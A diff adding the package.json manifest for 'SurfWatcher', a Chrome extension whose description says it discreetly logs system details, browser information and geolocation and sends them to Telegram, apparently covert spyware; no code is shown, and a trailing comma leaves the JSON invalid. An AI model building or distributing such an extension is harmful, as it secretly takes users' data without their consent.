@@ -1,0 +1,21 @@
+{
+  "name": "SurfWatcher",
+  "version": "1.0.0",
+  "description": "A Chrome extension to discreetly log and send system details, browser info, and more to Telegram.",
+  "main": "background.js",
+  "author": "Lokesh Chauhan",
+  "license": "GPL-3.0 license",
+  "dependencies": {
+    "xmlhttprequest": "^1.8.0"
+  },
+  "devDependencies": {
+  "prettier": "^3.0.0"
+  },
+  "keywords": [
+    "chrome-extension",
+    "telegram",
+    "geolocation",
+    "browser-info",
+   ]
+}
+  
